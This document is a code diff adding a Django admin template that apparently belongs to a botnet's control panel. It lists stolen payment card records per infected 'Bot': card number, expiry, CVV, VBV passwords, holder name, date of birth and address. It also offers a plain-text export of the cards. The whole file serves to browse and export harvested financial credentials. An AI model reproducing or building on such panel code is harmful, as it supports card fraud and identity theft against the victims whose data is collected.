@@ -1,0 +1,84 @@
+{% extends "admin/change_list.html" %}
+{% load i18n admin_static admin_list bootstrapped_goodies_tags %}
+{% load url from future %}
+{% load admin_urls %}
+{% load info_filters %}
+
+{% if not is_popup %}
+    {% block breadcrumbs %}
+        <ul class="breadcrumb">
+            <li><a href="{% url 'admin:index' %}">{% trans 'Home' %}</a></li>
+            <li>Info</li>
+            <li>Cards</li>
+        </ul>
+    {% endblock %}
+{% endif %}
+
+{% block coltype %}flex{% endblock %}
+
+{% block object-tools %}
+{% endblock %}
+
+{% block content %}
+    <div class="row-fluid">
+
+        <div class="span12">
+            <div id="content-main" class="row-fluid">
+                <div><a href="{% url 'cards_export' 'export' %}">Export (plain text)</a></div>
+                <div class="module{% if cl.has_filters %} filtered{% endif %}" id="_changelist">
+                    {% block result_list %}
+                        <table id="result_list" class="table table-striped">
+                            <thead>
+                            <tr>
+                                {% if request.user.is_superuser %}
+                                    <th>Bot</th>
+                                {% endif %}
+                                <th>Card data</th>
+                                <th>Card #</th>
+                                <th>Exp</th>
+                                <th>CVV</th>
+                                <th>VBV</th>
+                                <th>VBV2</th>
+                                <th>Name</th>
+                                <th>Date of birth</th>
+                                <th>ZipCode</th>
+                                <th>Country</th>
+                            </tr>
+                            </thead>
+                            {% for el in cards %}
+                                <tr class="{% cycle 'row1' 'row2' %}">
+                                    {% if request.user.is_superuser %}
+                                        <td>
+                                            <a href="{% url 'bot_by_code' el.code %}">{{ el.code }}</a><br>
+                                            <a href="{% url 'hide_card_info' el|named_field:'_id' %}"><span
+                                                    class="glyphicon glyphicon-remove"></span></a>
+                                        </td>
+                                    {% endif %}
+                                    <td>{{ el.data|print_card_info }}</td>
+                                    <td>{{ el.data.card.number|remove_spaces }}</td>
+                                    <td>{{ el.data.card.year }}/{{ el.data.card.month }}</td>
+                                    <td>{{ el.data.card.cvc }}</td>
+                                    <td>{{ el.data|named_field:'additional information'|named_field:'vbv password' }}</td>
+                                    <td>{{ el.data|named_field:'additional information'|named_field:'old vbv password'|default:'' }}</td>
+                                    <td>{{ el.data|card_holder }}</td>
+                                    <td>{{ el.data|named_field:'billing address'|named_field:'date of birth' }}</td>
+                                    <td>{{ el.data|named_field:'billing address'|named_field:'zip code' }}</td>
+                                    <td>{{ el.data|named_field:'billing address'|named_field:'country' }}</td>
+                                </tr>
+                            {% endfor %}
+                        </table>
+                    {% endblock %}
+                </div>
+            </div>
+        </div>
+
+    </div>
+    {% comment %}
+    {% block pagination %}
+        {% pagination cl %}
+    {% endblock %}
+{% endcomment %}
+    </form>
+{% endblock %}
+
+
